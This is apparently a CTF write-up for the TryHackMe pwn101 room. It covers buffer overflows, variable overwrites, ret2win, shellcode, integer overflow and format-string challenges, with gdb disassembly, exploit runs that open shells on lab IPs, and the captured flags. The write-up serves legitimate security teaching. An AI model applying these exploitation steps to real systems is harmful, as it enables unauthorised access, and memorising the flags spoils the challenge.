## Challenge Name: THM_pwn101



Challenge Description:
Learn pwn

    Buffer overflow
    Modify variable's value
    Return to win
    Return to shellcode
    Integer Overflow
    Format string exploit
    Bypassing mitigations
    GOT overwrite
    Return to PLT
    Playing with ROP


## Recon
Using `rustscan`  to scan port on target machine. Those open ports are 80.

![img](CTF_img/THM_pwn101/1.png)


## Flag1
  Generate multiple A to overflow input and it give a shell using `python -c 'print("A"*200)'` to do it and send payload to server on port `9001`

  ```bash
  nc 10.10.112.19 9001
         ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
          │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
          ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                   pwn 101

  Hello!, I am going to shopping.
  My mom told me to buy some ingredients.
  Ummm.. But I have low memory capacity, So I forgot most of them.
  Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

  Type the required ingredients to make briyani:
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  Thanks, Here's a small gift for you <3

  id
  uid=1002(pwn101) gid=1002(pwn101) groups=1002(pwn101)
  ls
  flag.txt
  pwn101
  pwn101.c
  cat flag.txt
  THM{7h4t's_4n_3zy_oveRflowwwww}
  ```
  And we get the first flag `THM{7h4t's_4n_3zy_oveRflowwwww}`

## Flag2
Load the program to `gdb` and `disassemble main` to get read logic of program.

```asm
  0x000055555540093c <+62>:    call   0x555555400730 <printf@plt>
  0x0000555555400941 <+67>:    lea    rax,[rbp-0x70]
  0x0000555555400945 <+71>:    mov    rsi,rax
  0x0000555555400948 <+74>:    lea    rdi,[rip+0x217]        # 0x555555400b66
  0x000055555540094f <+81>:    mov    eax,0x0
  0x0000555555400954 <+86>:    call   0x555555400750 <__isoc99_scanf@plt>
  0x0000555555400959 <+91>:    cmp    DWORD PTR [rbp-0x4],0xc0ff33
  0x0000555555400960 <+98>:    jne    0x555555400992 <main+148>
  0x0000555555400962 <+100>:   cmp    DWORD PTR [rbp-0x8],0xc0d3
  0x0000555555400969 <+107>:   jne    0x555555400992 <main+148>
  0x000055555540096b <+109>:   mov    edx,DWORD PTR [rbp-0x8]
  0x000055555540096e <+112>:   mov    eax,DWORD PTR [rbp-0x4]
  0x0000555555400971 <+115>:   mov    esi,eax
  0x0000555555400973 <+117>:   lea    rdi,[rip+0x1ef]        # 0x555555400b69
  0x000055555540097a <+124>:   mov    eax,0x0
  0x000055555540097f <+129>:   call   0x555555400730 <printf@plt>
  0x0000555555400984 <+134>:   lea    rdi,[rip+0x1f4]        # 0x555555400b7f
  0x000055555540098b <+141>:   call   0x555555400720 <system@plt>
```

Above is main logic help us pass this chall code above do is load our in put to `rbp-0x70` which buffer we can control and we see `<system@plt>` system call that we can get a shell but tp get there we have pass codition of `cmp    DWORD PTR [rbp-0x8],0xc0d3 and DWORD PTR [rbp-0x8],0xc0d3` compare value in stack to get to system call. Now thing we  should do is manipulate rbp, remember stack go from high address to low address so our payload will go from `[rbp-0x70] to [rbp-0x00]`  mean it [rbp-0x8] is in front of [rbp-0x4]
We using [exploit](CTF_exploit/THM_pwn101/pwn102.py) and get a flag:
```bash
python pwn102.py
[+] Opening connection to 10.10.83.22 on port 9002: Done
[*] Switching to interactive mode
Yes, I need c0ff33 to c0d3
$ id
uid=1003(pwn102) gid=1003(pwn102) groups=1003(pwn102)
$ cat flag.txt
THM{y3s_1_n33D_C0ff33_to_C0d3_<3}
$

```
## Flag3
Use gdb to reverse engineee `general` func using `disassemble general`  and remember `scanf` with option `%s` will cause some problem with our payload , if we read the assembly code we now buffer is 32 so we need more 8 byte to overwrite rbp and  6 byte to write to rip. This only to find offset not payload and after that we find `offset = 40`

![img](CTF_img/THM_pwn101/1.png)

We find admin funtion let see what it does
```bash
gef➤  disassemble admins_only
Dump of assembler code for function admins_only:
   0x0000000000401554 <+0>:     push   rbp
   0x0000000000401555 <+1>:     mov    rbp,rsp
   0x0000000000401558 <+4>:     sub    rsp,0x10
   0x000000000040155c <+8>:     lea    rax,[rip+0x1d04]        # 0x403267
   0x0000000000401563 <+15>:    mov    rdi,rax
   0x0000000000401566 <+18>:    call   0x401040 <puts@plt>
   0x000000000040156b <+23>:    lea    rax,[rip+0x1d0a]        # 0x40327c
   0x0000000000401572 <+30>:    mov    rdi,rax
   0x0000000000401575 <+33>:    call   0x401040 <puts@plt>
   0x000000000040157a <+38>:    lea    rax,[rip+0x1d0e]        # 0x40328f
   0x0000000000401581 <+45>:    mov    rdi,rax
   0x0000000000401584 <+48>:    call   0x401050 <system@plt>
   0x0000000000401589 <+53>:    nop
   0x000000000040158a <+54>:    leave
   0x000000000040158b <+55>:    ret
End of assembler dump.

```
We see it have system call this is the way to done it our return address will be system func address. We are dealing with server that have issue [MOVAPS issue](https://ypl.coffee/r0pbaby/#section5) make us can return directly to system call despite that we have to go through another return gadget in our program.
```bash
objdump -d ./pwn103-1644300337872.pwn103 | grep ret
  401016:       c3                      ret
  4010e0:       c3                      ret
  401110:       c3                      ret

```
We using [exploit](CTF_exploit/THM_pwn101/pwn103.py)  and get the flag
```bash
python pwn103.py
[+] Opening connection to 10.10.83.22 on port 9003: Done
[*] '/home/kali/pwn103-1644300337872.pwn103'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] Switching to interactive mode
Try harder!!! 💪

👮  Admins only:

Welcome admin 😄
$ ls
flag.txt
pwn103
pwn103.c
$ cat flag.txt
THM{w3lC0m3_4Dm1N}
$

```

## Flag4
Like usually step we find offset is 88 and the what to attack is return direct to shellcode very basic and we use  [exploit](CTF_exploit/THM_pwn101/pwn104.py)
```bash
python pwn104.py
[+] Opening connection to 10.10.113.69 on port 9004: Done
[*] '/home/kali/pwn104-1644300377109.pwn104'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
[*] consumed line: 140728156855456
[*] Switching to interactive mode
$ id
uid=1005(pwn104) gid=1005(pwn104) groups=1005(pwn104)
$ ls
flag.txt
pwn104
pwn104.c
$ cat flag.txt
THM{0h_n0o0o0o_h0w_Y0u_Won??}
$
```

## Flag5
We use integer overflow with this challenge is int 32 with max value went perform addtion is `2147483647` so first input will be `2147483647` and second input is `1`
 ``` bash
 nc 10.10.113.69 9005
        ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
         │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
         ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                  pwn 105


 -------=[ BAD INTEGERS ]=-------
 |-< Enter two numbers to add >-|

 ]>> 2147483647
 ]>> 1

 [*] C: -2147483648
 [*] Popped Shell
 [*] Switching to interactive mode
 ls
 flag.txt
 pwn105
 pwn105.c
 cat flag.txt
 THM{VerY_b4D_1n73G3rsss}
 ```
## Flag6
Use can read [doc](https://owasp.org/www-community/attacks/Format_string_attack) about how to fully exploit this vul but in this chall the hardest part is brute force stack data (flag from 6 to 11 pointer)and uncode it by unhex and reverse hex and get the flag [exploit](CTF_exploit/THM_pwn101/pwn106.py)
## Flag5
